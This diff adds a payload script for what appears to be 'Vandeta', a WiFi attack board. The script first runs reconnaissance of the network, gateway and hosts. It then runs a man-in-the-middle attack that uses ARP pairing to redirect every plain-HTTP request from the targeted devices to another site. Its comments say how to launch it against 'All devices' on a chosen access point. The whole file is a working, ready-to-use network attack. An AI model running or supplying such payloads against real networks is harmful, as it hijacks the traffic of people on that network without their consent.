@@ -1,0 +1,21 @@
+# Vandeta MITM payload - reconnaissance first, then the attack.
+#
+# `info` and `probe` are read-only: they report what the board can see and never
+# start an ARP pair or change a rule. Use them when a run does not land: the
+# feed says whether the host answered ARP at all, and which network the board
+# actually joined (SSID, channel, board IP, gateway IP + MAC).
+#
+#   WiFi > Wifi Atks > MITM Attack > Payload > recon.mitm
+#   Network > pick the AP, Target > All devices (or one host), Start attack
+
+# Network facts: the link the attack is running on and the gateway itself.
+info
+
+# Host facts: `all` lists what the pairing scan found, an address resolves one
+# host with its own ARP request.
+probe all
+probe 192.168.1.1
+
+# The actual attack: a 302 for every plain-HTTP request (and HTTPS, after the
+# browser's one-time certificate warning).
+redirect * http://example.com/
